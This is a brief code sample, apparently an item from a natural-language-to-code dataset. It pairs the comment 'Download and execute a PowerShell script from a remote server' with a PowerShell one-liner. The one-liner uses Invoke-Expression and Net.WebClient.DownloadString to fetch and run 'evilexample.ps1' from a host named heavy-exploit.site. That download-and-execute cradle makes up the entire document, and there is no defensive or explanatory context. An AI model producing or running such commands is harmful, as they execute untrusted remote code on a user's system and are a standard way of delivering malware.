# Natural language intent:
# Download and execute a PowerShell script from a remote server.

Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://heavy-exploit.site/evilexample.ps1')"
